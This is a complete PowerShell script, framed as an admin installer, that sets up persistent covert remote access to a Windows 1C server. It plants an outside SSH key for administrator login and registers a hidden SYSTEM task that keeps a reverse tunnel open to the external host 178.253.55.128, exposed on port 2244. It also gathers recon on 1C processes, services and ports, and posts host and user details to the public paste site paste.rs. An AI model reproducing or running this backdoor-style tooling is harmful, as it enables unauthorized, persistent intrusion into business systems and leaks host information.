# srv_setup.ps1 - ONE-SHOT elevated installer for the reverse-SSH channel on machine 239677631
# (desktop-vgvheou, the 1C-server-admin box). Mirrors the KSO cash setup but on PORT 2244.
# Installs OpenSSH server, opens firewall 22, installs /work's login pubkey, GENERATES the tunnel
# keypair locally (private key never leaves this machine), registers the SRVTunnel autostart task
# (SYSTEM, at boot+logon) that keeps  ssh -R 0.0.0.0:2244:127.0.0.1:22 root@178...  alive, runs
# recon, and POSTs a NON-SECRET bootstrap blob (tunnel PUBLIC key + hostname + user) to paste.rs so
# /work can pick it up. All progress -> C:\srv\ssh\setup.log.
$ErrorActionPreference='Continue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$base='C:\srv\ssh'
New-Item -ItemType Directory -Force -Path $base | Out-Null
$log="$base\setup.log"
function L($m){ Add-Content -Path $log -Value ((Get-Date -Format o)+' '+$m) -Encoding UTF8 }
Set-Content -Path $log -Value ('=== srv_setup begin '+(Get-Date -Format o)+' ===') -Encoding UTF8
$id=[Security.Principal.WindowsIdentity]::GetCurrent()
$el=([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
L ('elevated='+$el+' user='+$env:USERNAME)
if(-not $el){ L 'NOT ELEVATED - abort'; Write-Host 'NOT ELEVATED'; exit 1 }

# 1. OpenSSH Server (+Client)
try{
  $srv=Get-WindowsCapability -Online -Name 'OpenSSH.Server*'
  L ('server cap: '+$srv.Name+' state='+$srv.State)
  if($srv.State -ne 'Installed'){ $r=Add-WindowsCapability -Online -Name $srv.Name; L ('  add server -> RestartNeeded='+$r.RestartNeeded) }
}catch{ L ('server cap ERR: '+$_.Exception.Message) }
try{
  $cli=Get-WindowsCapability -Online -Name 'OpenSSH.Client*'
  if($cli.State -ne 'Installed'){ $r=Add-WindowsCapability -Online -Name $cli.Name; L ('  add client -> RestartNeeded='+$r.RestartNeeded) } else { L 'client cap Installed' }
}catch{ L ('client cap ERR: '+$_.Exception.Message) }
if(-not (Test-Path 'C:\Windows\System32\OpenSSH\sshd.exe')){
  L 'sshd.exe missing after capability -> GitHub fallback'
  try{
    $url='https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.8.1.0p1-Preview/OpenSSH-Win64.zip'
    $zip="$env:TEMP\OpenSSH-Win64.zip"
    Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing
    Expand-Archive -Path $zip -DestinationPath 'C:\Program Files\OpenSSH' -Force
    & 'C:\Program Files\OpenSSH\OpenSSH-Win64\install-sshd.ps1'
    L 'GitHub OpenSSH installed'
  }catch{ L ('github fallback ERR: '+$_.Exception.Message) }
}

# 2. services
try{ Set-Service ssh-agent -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service ssh-agent -ErrorAction SilentlyContinue }catch{}
try{ Set-Service sshd -StartupType Automatic; Start-Service sshd; $s=Get-Service sshd; L ('sshd status='+$s.Status+' start='+$s.StartType) }catch{ L ('sshd svc ERR: '+$_.Exception.Message) }

# 3. firewall 22/tcp
try{
  if(-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)){
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH SSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
    L 'firewall rule created (22/tcp)'
  } else { Enable-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue; L 'firewall rule present' }
}catch{ L ('firewall ERR: '+$_.Exception.Message) }

# 4. administrators_authorized_keys  (login as an admin -> key lives here)
try{
  $ak='C:\ProgramData\ssh\administrators_authorized_keys'
  $pub='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJxIUvI3uBE9UV6sE2cckiohg7m1E5oIAmhjh+sBYN work-to-srv'
  New-Item -ItemType Directory -Force -Path 'C:\ProgramData\ssh' | Out-Null
  # append if not present (do not clobber existing keys)
  $cur=''; if(Test-Path $ak){ $cur=Get-Content $ak -Raw }
  if($cur -notmatch 'work-to-srv'){ Add-Content -Path $ak -Value $pub -Encoding ascii }
  icacls $ak /inheritance:r | Out-Null
  icacls $ak /grant 'SYSTEM:F' | Out-Null
  icacls $ak /grant 'BUILTIN\Administrators:F' | Out-Null
  L 'authorized_keys ensured'
}catch{ L ('authkeys ERR: '+$_.Exception.Message) }

# 5. generate tunnel keypair LOCALLY (private stays on this machine)
try{
  $key="$base\srv_tunnel"
  if(-not (Test-Path $key)){
    & ssh-keygen -t ed25519 -f $key -N '""' -C 'srv-to-vps-2244' | Out-Null
    L 'tunnel keypair generated'
  } else { L 'tunnel keypair exists' }
  # lock private key perms so ssh.exe (run as SYSTEM) accepts it
  $sys=New-Object System.Security.Principal.SecurityIdentifier('S-1-5-18')
  $adm=New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
  $acl=Get-Acl -Path $key
  $acl.SetOwner($sys); $acl.SetAccessRuleProtection($true,$false)
  @($acl.Access) | ForEach-Object { [void]$acl.RemoveAccessRule($_) }
  $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sys,'Read','Allow')))
  $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($adm,'Read','Allow')))
  Set-Acl -Path $key -AclObject $acl
  L 'tunnel key perms locked'
}catch{ L ('tunnel key ERR: '+$_.Exception.Message) }

# 6. harden sshd: key-only (2244 is internet-exposed via GatewayPorts on the VPS)
try{
  $cfg='C:\ProgramData\ssh\sshd_config'
  if(Test-Path $cfg){
    $c=Get-Content $cfg -Raw
    $c=$c -replace '(?m)^\s*#?\s*PasswordAuthentication\s+.*$',''
    $c=$c -replace '(?m)^\s*#?\s*PubkeyAuthentication\s+.*$',''
    $c=$c.TrimEnd()+"`r`nPubkeyAuthentication yes`r`nPasswordAuthentication no`r`n"
    Set-Content -Path $cfg -Value $c -Encoding ascii
    Restart-Service sshd
    L ('sshd_config hardened; sshd='+(Get-Service sshd).Status)
  } else { L 'WARN sshd_config not found' }
}catch{ L ('hardening ERR: '+$_.Exception.Message) }

# 7. watchdog script (reverse tunnel on PORT 2244)
try{
  $wd="$base\srv_tunnel_watchdog.ps1"
  $wdContent=@'
$ErrorActionPreference='Continue'
$key='C:\srv\ssh\srv_tunnel'
$kh ='C:\srv\ssh\known_hosts'
$log='C:\srv\ssh\tunnel.log'
function L($m){ try{ Add-Content -Path $log -Value ((Get-Date -Format o)+' '+$m) -Encoding UTF8 }catch{} }
try{ if((Test-Path $log) -and ((Get-Item $log).Length -gt 1MB)){ Clear-Content $log } }catch{}
L ('watchdog start pid='+$PID+' user='+$env:USERNAME)
while($true){
  L 'connecting to 178.253.55.128'
  & ssh -i $key -o "UserKnownHostsFile=$kh" -o StrictHostKeyChecking=accept-new `
        -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes `
        -o BatchMode=yes -o ConnectTimeout=20 -N `
        -R 0.0.0.0:2244:127.0.0.1:22 root@178.253.55.128 2>&1 | ForEach-Object { L ("ssh: $_") }
  L 'ssh exited; sleep 10 then reconnect'
  Start-Sleep -Seconds 10
}
'@
  Set-Content -Path $wd -Value $wdContent -Encoding UTF8
  L 'watchdog written'
}catch{ L ('watchdog write ERR: '+$_.Exception.Message) }

# 8. autostart task SRVTunnel (SYSTEM, boot+logon)
try{
  $act=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\srv\ssh\srv_tunnel_watchdog.ps1'
  $t1=New-ScheduledTaskTrigger -AtStartup
  $t2=New-ScheduledTaskTrigger -AtLogOn
  $pr=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest
  $set=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew
  Register-ScheduledTask -TaskName 'SRVTunnel' -Action $act -Trigger $t1,$t2 -Principal $pr -Settings $set -Force | Out-Null
  Start-ScheduledTask -TaskName 'SRVTunnel'
  L 'SRVTunnel task registered+started'
}catch{ L ('task ERR: '+$_.Exception.Message) }

# 9. RECON -> recon.txt
try{
  $recon="$base\recon.txt"
  "=== RECON $(Get-Date -Format o) ===" | Set-Content $recon -Encoding UTF8
  "hostname: $(hostname)" | Add-Content $recon
  "whoami: $(whoami)" | Add-Content $recon
  "--- admin group membership ---" | Add-Content $recon
  (whoami /groups | Select-String 'S-1-5-32-544') -join "`n" | Add-Content $recon
  "--- 1C server cluster processes (ragent/rmngr/rphost/ras/rac) ---" | Add-Content $recon
  (tasklist | Select-String -Pattern 'ragent|rmngr|rphost|ras\.exe|rac\.exe|1cv8') -join "`n" | Add-Content $recon
  "--- services matching 1C/Agent/Apache/W3SVC ---" | Add-Content $recon
  (Get-Service | Where-Object { $_.Name -match '1C|Apache|W3SVC|ragent|1cv8' -or $_.DisplayName -match '1C|Apache|IIS|World Wide Web' } | Select-Object Status,Name,DisplayName | Format-Table -AutoSize | Out-String) | Add-Content $recon
  "--- 1cv8 platform dirs ---" | Add-Content $recon
  "[C:\Program Files\1cv8]" | Add-Content $recon
  (Get-ChildItem 'C:\Program Files\1cv8' -Name -ErrorAction SilentlyContinue) -join "`n" | Add-Content $recon
  "[C:\Program Files (x86)\1cv8]" | Add-Content $recon
  (Get-ChildItem 'C:\Program Files (x86)\1cv8' -Name -ErrorAction SilentlyContinue) -join "`n" | Add-Content $recon
  "--- rac.exe / ras.exe locations ---" | Add-Content $recon
  (Get-ChildItem 'C:\Program Files\1cv8','C:\Program Files (x86)\1cv8' -Recurse -Include 'rac.exe','ras.exe' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName) -join "`n" | Add-Content $recon
  "--- listening ports 1540/1541/1560-1591/80/443 ---" | Add-Content $recon
  (Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | Where-Object { $_.LocalPort -in 1540,1541,1545,80,443 -or ($_.LocalPort -ge 1560 -and $_.LocalPort -le 1591) } | Select-Object LocalAddress,LocalPort | Sort-Object LocalPort -Unique | Format-Table -AutoSize | Out-String) | Add-Content $recon
  L 'recon written'
}catch{ L ('recon ERR: '+$_.Exception.Message) }

# 10. POST NON-SECRET bootstrap blob (tunnel PUBLIC key + host + user) to paste.rs
try{
  $tpub=(Get-Content "$base\srv_tunnel.pub" -Raw).Trim()
  $adminYes = (whoami /groups | Select-String 'S-1-5-32-544') -ne $null
  $blob = @()
  $blob += '==HOST=='
  $blob += (hostname)
  $blob += '==USER=='
  $blob += (whoami)
  $blob += '==ADMIN=='
  $blob += [string]$adminYes
  $blob += '==TUNPUB=='
  $blob += $tpub
  $blob += '==END=='
  $body = ($blob -join "`n")
  $u = Invoke-RestMethod -Uri 'https://paste.rs' -Method Post -Body $body
  L ('paste url: '+$u)
  Write-Host ''
  Write-Host '################## PASTE URL BELOW ##################'
  Write-Host $u
  Write-Host '####################################################'
}catch{ L ('paste ERR: '+$_.Exception.Message); Write-Host ('PASTE ERR: '+$_.Exception.Message) }

L '=== srv_setup end ==='
Write-Host 'srv_setup DONE. log: C:\srv\ssh\setup.log'
